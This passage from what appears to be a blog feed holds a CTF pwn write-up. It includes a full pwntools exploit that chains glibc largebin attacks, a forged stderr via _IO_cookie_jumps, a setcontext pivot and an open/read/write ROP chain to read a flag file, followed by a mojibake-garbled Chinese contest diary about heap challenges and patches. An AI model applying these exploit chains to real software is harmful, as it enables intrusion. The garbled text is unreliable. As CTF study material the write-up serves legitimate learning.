class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">offset = <span class="number">0x300740</span></span><br><span class="line">tls_offset = offset</span><br><span class="line">tls_offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">tls_offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(tls_offset))</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line">            r=p.recvuntil(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">flag = r+p.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">log.success(flag)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ËÆ≤Ê∞¥ËØæÔºåÊÅ∞Â§ßÁ±≥&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ê≤ôÁÆ±ÂºÄÂêØÔºåËÄÉËôëorw&lt;/p&gt;
&lt;p&gt;‰øùÊä§ÂÖ®ÂºÄ&lt;/p&gt;
&lt;h2 id=&quot;VMÂàÜÊûê&quot;&gt;&lt;a href=&quot;#VMÂàÜÊûê&quot; class=&quot;headerlink&quot; title=&quot;VMÂàÜÊûê&quot;&gt;&lt;/a&gt;VM</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-2023ÂçäÂÜ≥ËµõÊ∏∏ËÆ∞</title>
    <link href="http://deepunk.icu/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/"/>
    <id>http://deepunk.icu/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/</id>
    <published>2023-06-12T11:14:12.000Z</published>
    <updated>2023-12-14T15:09:48.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="6-10"><a href="#6-10" class="headerlink" title="6.10"></a>6.10</h1><p>È£ûÂæÄ‰∫ëÂçó</p><p>‰∏úËà™ÁöÑÁ©∫‰πòÂ∞èÂßêÂßêËøòÁªôÊàëÈÄÅÊù•‰∏Ä‰∏™ÁîüÊó•ËõãÁ≥ïÔºåÊ≥™ÁõÆÔºåËøòÊå∫Â•ΩÂêÉ</p><p>‰∫ëÂ§ßÁöÑËµõÂú∫Â§öÂ∞ëÊúâÁÇπÂØíÈÖ∏‰∫ÜÔºåÂ§ßÈó®ÊØîÊàëÂØùÂÆ§Èó®Â§ß‰∏ç‰∫ÜÂ§öÂ∞ë</p><p>Ê≤°ÁΩëÁ∫øËΩ¨Êé•Âô®ÔºåÂéªÂ§ñÈù¢‰π∞„ÄÇËÄÅÊùøËØ¥‰∏çÂºÄÂèëÁ•®90‰∏Ä‰∏™ÔºåÂºÄÂèëÁ•®110</p><p>‰π∞‰∫Ü‰∏§‰∏™ÔºåËøôÊó∂Ë•øÂçéÁöÑÈòü‰ºç‰πüÊù•‰π∞ËΩ¨Êé•Âô®„ÄÇÊàë‰ª¨ÁúºÁùÅÁùÅÁúãÁùÄËÄÅÊùøÂùêÂú∞Ëµ∑‰ª∑Ôºå‰∏çÂºÄÂèëÁ•®110ÔºåÂºÄÂèëÁ•®130</p><p>Êôö‰∏äÂêÉ‰∫ÜÁ∫¢‰ºû‰ºû„ÄÅÁôΩ‰ºû‰ºû„ÄÅÈªÑ‰ºû‰ºûÔºåÂøÉÊª°ÊÑèË∂≥Âú∞Á≠âÁùÄÂ∞è‰∫∫ÊïôÊàëÊâìpwn</p><p>ÂõûÂéªÊääunlinkÁúãÂÆåÔºåÂ∞è‰∫∫ËøòÊ≤°Âá∫Áé∞ÔºåÂ§ßÊäµÊòØÈ∏Ω‰∫Ü</p><h1 id="6-11"><a href="#6-11" class="headerlink" title="6.11"></a>6.11</h1><p>Êú¨Êù•ÊÉ≥ÁöÑÊòØBeethovenË¥üË¥£Ë°•Ë°•Ë°•ÔºåÊàëË¥üË¥£ÊùÄÊùÄÊùÄÔºåÁªìÊûúÁ¨¨‰∏ÄÊ≥¢È¢òÂ∞±Áªô‰∫ÜÊàëÂ∞èÂ∞èÁöÑÈúáÊíº</p><p>‰∏ÄÈÅìÊòØÂ†ÜÈ¢òÔºåÂè¶‰∏ÄÈÅì‰πüÊòØÂ†ÜÈ¢ò</p><p>ÊàëartistËøòÊ≤°ÈÄÜÂÆåÔºåÂà´‰∫∫CNSSÂ∑≤ÁªèÊääÊ¥ûË°•Â•Ω‰∫ÜÔºåÊÄ•Ê≠ªÊàë‰∫Ü</p><hr><h2 id="artist-patch"><a href="#artist-patch" class="headerlink" title="artist_patch"></a>artist_patch</h2><p>Êï¥ÈÅìÈ¢òÁöÑÂäüËÉΩÂ§ßÊ¶ÇÊòØÔºåÈÄâÈ°π1ÂàÜÈÖç‰∏Ä‰∏™80hÁöÑchunkÔºåÂπ∂ËØªÂèñ‰∏çË∂ÖËøá80hÁöÑËæìÂÖ•ÔºõÈÄâÈ°π2Â∞ÜÊåáÂÆöchunkÂÜÖÂÆπËæìÂá∫Âπ∂freeÊéâÔºåfree‰πãÂâçÂèØ‰ª•Êõ¥ÊîπchunkÂºÄÂ§¥ÁöÑ10hÂ≠óËäÇÔºõÈÄâÈ°π3ÊòØÂ∞ÜÊüê‰∏™chunkÂºÄÂßãÁöÑÁ¨¨‰ªªÊÑè‰∏™Â≠óËäÇÁΩÆ‰∏∫NULL</p><p>Êï¥‰∏™Á®ãÂ∫è‰∏≠Ê≤°ÊúâÂèëÁé∞Ê∫¢Âá∫Ôºå‰ΩÜÊòØ‰ºº‰πéÂèØ‰ª•Âà©Áî®3ÁöÑÂäüËÉΩÂÆûÁé∞ÂØπchunk headerÁöÑÊîπÂÜôÔºåÁÑ∂ÂêéÊâì‰∏Ä‰∏™unlink</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194620801.png" alt="image-20230612194620801"></p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194711287.png" alt="image-20230612194711287"></p><p>‰ΩÜÊòØÂõ†‰∏∫ÂºÄ‰∫ÜFull RELROÔºåÊó†Ê≥ïËøõË°ågot hijackingÔºå‰ø∫Ê®™Á´ñÊÉ≥‰∫ÜÂçäÂ§©‰πüÊâæ‰∏çÂà∞Âä´ÊåÅÊéßÂà∂ÊµÅÁöÑÂäûÊ≥ïÔºå‰ΩÜÊòØpatchËøòÊòØÂèØ‰ª•ÂÅöÂà∞ÁöÑÔºåÂè™ÈúÄË¶ÅËÆ©Êõ¥ÊîπÁöÑbyte‰∏çË∂ÖËøáchunkËåÉÂõ¥Â∞±ÂèØ‰ª•‰∫Ü</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195202307.png" alt="image-20230612195202307"></p><p>‰∫éÊòØÊàëÂ∞Ümy_read‰∏≠canaryÈÉ®ÂàÜÊîπÂÜôÊàêrax‰∏é80hÁöÑÊØîËæÉË∑≥ËΩ¨ËØ≠Âè•ÔºåÊàêÂäüpatch</p><h2 id="over-patch"><a href="#over-patch" class="headerlink" title="over_patch"></a>over_patch</h2><p>Êú¨Âú∫ÂîØ‰∏Ä‰∏ÄÈÅìÈùûÂ†ÜÈ¢òÔºåÊÄé‰πàÂäûÊÄé‰πàÂäûÊàëËøòÊòØ‰∏ç‰ºö</p><p>ÈÄªËæëÂæàÁÆÄÂçïÔºåÊúâÂõõ‰∏™ÈÄâÈ°πÔºåÂâç‰∏â‰∏™ÈÄâÈ°πÈÉΩÊòØËØªÂÖ•‰∏Ä‰∏™Â∞è‰∫éÁ≠â‰∫é4ÁöÑÊï∞ÔºåËøõË°å‰∏ÄÈÄöÂæàÁåõÁöÑËÆ°ÁÆóÔºåÁÑ∂ÂêéÂ∞ÜÊüê‰∏™Âú∞ÂùÄÁöÑÂÜÖÂÆπ‰øÆÊîπ</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195909839.png" alt="image-20230612195909839"></p><p>ÈÄâÈ°π4ÊòØÂ∞ÜÁ®ãÂ∫èÂºÄÂ§¥ËæìÂÖ•ÁöÑÂêçÁß∞ÂÜçÊ¨°ËæìÂá∫„ÄÇÂÆûÁé∞ÊñπÊ≥ïÊòØÔºöÁ®ãÂ∫èÂºÄÂßãÊó∂ÊääputsÁöÑpltÂú∞ÂùÄÊîæÂÖ•Êüê‰∏™Âú∞ÂùÄÔºåÁÑ∂ÂêéÂÜçË∞ÉÁî®Ëøô‰∏™Âú∞ÂùÄ„ÄÇÂæàÊòæÁÑ∂ÔºåËøôÈáåÂèØ‰ª•Êõ¥ÊîπËøô‰∏™Âú∞ÂùÄÁöÑÂÜÖÂÆπÔºåËΩªÊùæÂú∞system(‚Äú&#x2F;bin&#x2F;sh‚Äù)</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200128649.png" alt="image-20230612200128649"></p><p>ÊâÄ‰ª•patch‰πüÈùûÂ∏∏ÁÆÄÂçïÔºåÂè™ÈúÄË¶ÅÊääË∞ÉÁî®Âú∞ÂùÄÊîπÊàêÁõ¥Êé•Ë∞ÉÁî®ÂáΩÊï∞Â∞±Ë°å‰∫Ü</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200535096.png" 